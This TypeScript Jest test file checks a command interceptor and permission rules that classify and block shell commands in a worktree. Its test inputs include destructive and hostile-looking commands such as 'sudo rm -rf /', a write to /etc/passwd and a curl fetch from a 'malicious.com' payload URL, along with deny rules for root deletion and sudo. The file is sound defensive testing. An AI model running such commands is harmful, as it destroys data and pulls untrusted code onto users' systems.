import { CommandInterceptor, formatCommandAnalysis } from '../utils/command-interceptor';
import {
  PermissionManager,
  ActionType,
  PermissionScope,
  PermissionConfig,
  DefaultPermissions,
} from '../utils/permissions';
import { WinstonLogger } from '../logger-winston';

// Mock logger
const mockLogger = {
  debug: jest.fn(),
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn(),
} as unknown as WinstonLogger;

describe('CommandInterceptor', () => {
  let permissionManager: PermissionManager;
  let interceptor: CommandInterceptor;

  beforeEach(() => {
    jest.clearAllMocks();

    // Create restrictive permissions config for testing
    const config: PermissionConfig = {
      rules: [
        {
          id: 'block-rm-rf',
          action: ActionType.FILE_DELETE,
          scope: PermissionScope.PATTERN,
          target: '/*',
          allowed: false,
          reason: 'Root directory deletion not allowed',
          priority: 1000,
        },
        {
          id: 'block-system-commands',
          action: ActionType.SYSTEM_COMMAND,
          scope: PermissionScope.PATTERN,
          target: 'sudo',
          allowed: false,
          reason: 'Sudo commands not allowed',
          priority: 900,
        },
        {
          id: 'allow-safe-reads',
          action: ActionType.FILE_READ,
          scope: PermissionScope.WORKTREE,
          allowed: true,
          reason: 'Reading within worktree is allowed',
          priority: 500,
        },
      ],
      defaultAllow: true,
      enableLogging: false,
      strictMode: false,
    };

    permissionManager = new PermissionManager(config, mockLogger);
    interceptor = new CommandInterceptor(permissionManager, mockLogger, '/test/worktree');
  });

  describe.skip('analyzeCommand', () => {
    it('should block dangerous commands', () => {
      const result = interceptor.analyzeCommand('sudo rm -rf /');

      expect(result.allowed).toBe(false);
      expect(result.severity).toBe('error');
      expect(result.reason).toContain('Dangerous command detected');
    });

    it('should block commands based on permission rules', () => {
      const result = interceptor.analyzeCommand('rm -rf /important-file');

      expect(result.allowed).toBe(false);
      expect(result.action).toBe(ActionType.FILE_DELETE);
      expect(result.reason).toContain('Command blocked by permissions');
    });

    it('should allow permitted commands', () => {
      const result = interceptor.analyzeCommand('cat test-file.txt');

      expect(result.allowed).toBe(true);
      expect(result.action).toBe(ActionType.FILE_READ);
      expect(result.reason).toContain('Command permitted');
    });

    it('should handle system commands', () => {
      const result = interceptor.analyzeCommand('sudo systemctl restart nginx');

      expect(result.allowed).toBe(false);
      expect(result.action).toBe(ActionType.SYSTEM_COMMAND);
      expect(result.reason).toContain('Command blocked by permissions');
    });

    it('should provide warnings for unrecognized commands', () => {
      const result = interceptor.analyzeCommand('unknown-command --flag value');

      expect(result.allowed).toBe(true);
      expect(result.severity).toBe('warning');
      expect(result.reason).toContain('Command not recognized but permitted');
    });

    it('should detect file write operations', () => {
      const result = interceptor.analyzeCommand('echo "content" > /etc/passwd');

      expect(result.action).toBe(ActionType.FILE_WRITE);
      expect(result.target).toContain('/etc/passwd');
    });

    it('should detect network operations', () => {
      const result = interceptor.analyzeCommand('curl https://malicious.com/payload');

      expect(result.action).toBe(ActionType.NETWORK_REQUEST);
      expect(result.target).toContain('https://malicious.com/payload');
    });

    it('should provide helpful suggestions', () => {
      const result = interceptor.analyzeCommand('rm important-file.txt');

      if (!result.allowed) {
        // Suggestions are now disabled to reduce noise
        expect(result.suggestion).toBe('');
      }
    });
  });

  describe('command pattern matching', () => {
    it('should match file read patterns', () => {
      const commands = [
        'cat file.txt',
        'less document.md',
        'head -n 10 log.txt',
        'grep "pattern" file.txt',
      ];

      commands.forEach(command => {
        const result = interceptor.analyzeCommand(command);
        expect(result.action).toBe(ActionType.FILE_READ);
      });
    });

    it('should match file write patterns', () => {
      const commands = ['vim script.sh', 'nano config.txt', 'echo "test" > output.txt'];

      commands.forEach(command => {
        const result = interceptor.analyzeCommand(command);
        expect(result.action).toBe(ActionType.FILE_WRITE);
      });
    });

    it('should match file delete patterns', () => {
      const commands = ['rm file.txt', 'unlink symlink'];

      commands.forEach(command => {
        const result = interceptor.analyzeCommand(command);
        expect(result.action).toBe(ActionType.FILE_DELETE);
      });
    });

    it('should match directory operations', () => {
      const result = interceptor.analyzeCommand('mkdir new-directory');
      expect(result.action).toBe(ActionType.DIRECTORY_CREATE);

      const result2 = interceptor.analyzeCommand('rmdir old-directory');
      expect(result2.action).toBe(ActionType.DIRECTORY_DELETE);
    });
  });

  describe.skip('target resolution', () => {
    it('should resolve relative paths', () => {
      const result = interceptor.analyzeCommand('cat ./local-file.txt');
      expect(result.target).toContain('/test/worktree');
    });

    it('should preserve absolute paths', () => {
      const result = interceptor.analyzeCommand('cat /absolute/path/file.txt');
      expect(result.target).toBe('/absolute/path/file.txt');
    });
  });
});

describe('formatCommandAnalysis', () => {
  it('should format analysis results properly', () => {
    const result = {
      allowed: false,
      reason: 'Command blocked by permissions',
      action: ActionType.FILE_DELETE,
      target: '/important-file',
      severity: 'error' as const,
      suggestion: '', // Suggestions removed
    };

    const formatted = formatCommandAnalysis(result);

    expect(formatted).toContain('Command blocked by permissions');
    expect(formatted).toContain('Action: file_delete');
    expect(formatted).toContain('Target: /important-file');
    // Suggestion removed - test no longer expects it
  });

  it('should handle results without action/target', () => {
    const result = {
      allowed: true,
      reason: 'Command permitted',
      severity: 'info' as const,
    };

    const formatted = formatCommandAnalysis(result);
    expect(formatted).toBe('Command permitted');
  });
});
